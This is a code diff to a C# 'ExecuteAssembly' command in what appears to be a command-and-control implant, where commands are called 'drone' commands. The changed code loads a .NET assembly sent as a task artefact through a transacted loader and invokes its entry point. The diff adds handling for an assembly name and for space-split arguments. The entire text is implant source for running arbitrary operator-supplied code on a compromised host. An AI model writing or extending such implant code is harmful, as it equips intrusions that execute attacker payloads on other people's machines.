@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Reflection;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -30,7 +31,11 @@ public sealed class ExecuteAssembly : DroneCommand
         {
             // load and run assembly
             using var transactAsm = new TransactedAssembly();
-            var asm = transactAsm.Load(task.Artefact);
+            
+            if (!task.Arguments.TryGetValue("assembly-name", out var assemblyName))
+                assemblyName = string.Empty;
+                
+            var asm = transactAsm.Load(task.Artefact, assemblyName);
 
             if (asm is null)
             {
@@ -39,8 +44,13 @@ public sealed class ExecuteAssembly : DroneCommand
                 return;
             }
 
+            var arguments = Array.Empty<string>();
+
+            if (task.Arguments.TryGetValue("args", out var args))
+                arguments = args.Split(' ');
+
             // this will block
-            asm.EntryPoint?.Invoke(null, new object[] { task.Arguments });
+            asm.EntryPoint?.Invoke(null, new object[] { arguments });
         }
 
         // whilst assembly is executing
